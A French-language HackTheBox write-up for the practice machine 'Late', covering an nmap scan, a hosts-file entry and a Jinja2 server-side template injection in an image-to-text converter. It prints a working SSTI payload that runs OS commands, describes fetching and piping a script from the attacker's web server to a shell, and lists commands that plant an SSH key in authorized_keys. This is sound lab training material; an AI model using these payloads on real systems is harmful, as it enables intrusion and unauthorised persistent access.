---
title:  "HacktheBox WriteUp : Late"
category: HackTheBox
tag: writeups
---

### Résumé

Late est une machine pour débutants basée sur une plateforme Linux.  
Niveau : Facile

### Savoir-faire
- Nmap
    

### Scanner le réseau

`sudo nmap 10.10.11.156 -sS -sV`

- \-sS Analyse du port TCP SYN (par défaut)
- \-sV Tente de déterminer la version du service fonctionnant sur le port

![ScanLate](/assets/images/WriteUps/HackTheBox/lateMachine/nmapLate.png)  
On s'apperçoit qu'il y a le port 80 ouvert, on va donc aller regarder le site .

![lateSite](/assets/images/WriteUps/HackTheBox/lateMachine/lateSite.png)

### Analyse du site

Après quelques recherches, on tombe sur un texte pointant vers un lien étrange et inaccessible.   
![lateBizare](/assets/images/WriteUps/HackTheBox/lateMachine/lateSiteBizarre.png)   
le lien en question : [images.late.htb](http://images.late.htb/)   
Cependant le lien redirige vers nulle part.  
On décide donc de l'ajouter à notre fichier /etc/hosts qui est un peu l'ancêtre du DNS (mais de manière non centralisée).
Ce fichier a pour rôle d'associer une adresse IP à un nom d'hôte, et il est consulté avant qu'une requête DNS soit faite.

On ajoute donc l'entrée comme ceci :   
`IPAddress DomainName [DomainAliases]`  
Ce qui donne pour notre cas :    
`10.10.11.156 http://images.late.htb/ images.late.htb`      
On a finalement accès à la page en question, qui contient un champ pour upload une image, dans le but 
d'en extraire le texte présent dessus.
![convertImage](/assets/images/WriteUps/HackTheBox/lateMachine/convertImage.png)

### Utilisation du convertisseur d'image

Après quelques recherches, on tombe sur ce blog nous indiquant quelques tests à faire dans le cas 
d'un SSTI (server side template injection, ou injection de template côté serveur) : [blog SSTI](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)

Après avoir lu les explications, et en regardant la cheatlist fournie, on voit en prenant une image de {{7x7}} que 
le résultat de la convertion d'image en texte nous renvoie ***<p>49</p>***   

On est dans le cas d'un serveur Flask/Jinja2.   

Le but est donc de pouvoir executer des commandes en ayant mis du code dans un image (on prend un screenshot du texte de la commande).

Je vous conseille la font [uni-neue](https://www.fontshmonts.com/text-fonts/uni-neue/) pour que les images
soient correctement détectés.

Dans le blog sur l'explication des SSTI, on voit les mots clés "request.application", avec une recherche google avec ces 
mots clés, on tombe sur ce blog : [SSTI with jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)   
La syntaxe pour executer une requête est donc 

`request.application.__globals__.__builtins__.__import__('os').popen('id').read()`
### Exploit 

À partir de là, on peut executer des commandes sur le serveur avec la commade precedente en remplaçant id par la requête. 
On décide de faire en sorte que le server execute un script accessible sur notre machine en faisant un curl sur un serveur
web (qu'on créé en écoute de notre côté), qui sera piper vers la commande shell pour executer ce script.   
Sur notre machine: 

`python3 -m http.server 8000` 

L'image à envoyer : 

![convertImage](/assets/images/WriteUps/HackTheBox/lateMachine/cmdToServer.png) 

On n'a plus qu'à créer un fichier cmd qui executera les commandes que l'on souhaite.
Dans notre cas on va mettre notre clé ssh sur le serveur pour pouvoir se connecter en shh (le port était ouvert).   
Le fichier cmd contient donc : 

`cat /home/svc_acc/user.txt`  
`mdkir /home/svc_acc/.ssh`  
`echo "ssh-rsa AAAA[....]an" >> /home/svc_acc/.ssh/authorized_keys` 

On peut ensuite faire un ssh et afficher le flag qui est présent sur le répertoire courant.



